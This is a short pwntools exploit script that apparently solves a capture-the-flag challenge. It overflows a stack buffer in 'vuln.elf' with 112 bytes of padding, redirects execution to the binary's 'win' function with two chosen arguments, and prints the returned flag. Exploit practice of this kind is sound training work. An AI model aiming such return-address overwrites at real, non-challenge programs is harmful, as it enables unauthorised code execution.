#!/usr/bin/env python3
from pwn import *
from sys import argv

def run():
	if len(argv) == 3:
		context.binary = "./vuln.elf"
		return remote(argv[1], argv[2])
	else:
		context.binary = "./vuln.elf"
		return process("./vuln.elf")

context.log_level = "error"
cyclicGen = cyclic_gen()

with run() as p:
	EIP = pack(context.binary.symbols.win)
	pad = pack(0x0)
	arg1 = pack(0xCAFEF00D)
	arg2 = pack(0xF00DF00d)
	payload = cyclicGen.get(112) + EIP + pad + arg1 + arg2

	p.recvuntil(b':')
	p.sendline(payload)

	p.recvline()
	p.recvline()
	flag = p.recvall().strip().decode("ascii")

info(f"The flag is: {flag}")
print(flag)

with open("payload", "wb") as payloadFile:
	payloadFile.write(payload)

